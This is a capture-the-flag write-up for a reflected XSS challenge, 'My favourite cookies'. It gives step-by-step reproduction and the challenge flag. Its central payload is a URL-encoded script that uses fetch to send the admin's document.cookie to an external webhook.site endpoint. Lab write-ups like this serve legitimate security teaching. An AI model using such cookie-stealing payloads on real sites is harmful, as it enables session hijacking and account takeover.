# Challenge `My favourite cookies`

* **Flag:** `SSof{This_is_admin_secret_secret}`
* **Vulnerability:** Reflected Cross-Site Scripting (XSS) 
* **Where:** “Link of the bug/feature request you want to report on” input field
* **Impact:** Allows an attacker to steal the administrator’s session cookie and impersonate the admin user

---

## Steps to reproduce

1. From the previous challenge, observe how the application URL-encodes the injected XSS payload when it is reflected in the search functionality.

2. Copy that URL-encoded payload to ensure it is correctly interpreted.

3. Insert it into the field:

> **“Link of the bug/feature request you want to report on”**

```text
http://ssof2526.challenges.cwte.me:25251/?search=%3Cscript%3Efetch%28%22https%3A%2F%2Fwebhook.site%2F0237655b-876d-49dc-b95f-9e890f48aa14%3Fcookie%3D%22+%2B+document.cookie%29%3C%2Fscript%3E
```

4. Click Submit to send the bug/feature request.

5. The application stores and later renders this URL for the admin to review.

6. When the admin opens the malicious link, the reflected XSS payload executes in the admin’s browser context.

7. The payload sends the admin’s cookies to my Webhook endpoint.

8. Inspect the Webhook logs and retrieve the leaked admin cookie, which contains the flag:

```
SSof{This_is_admin_secret_secret}
```
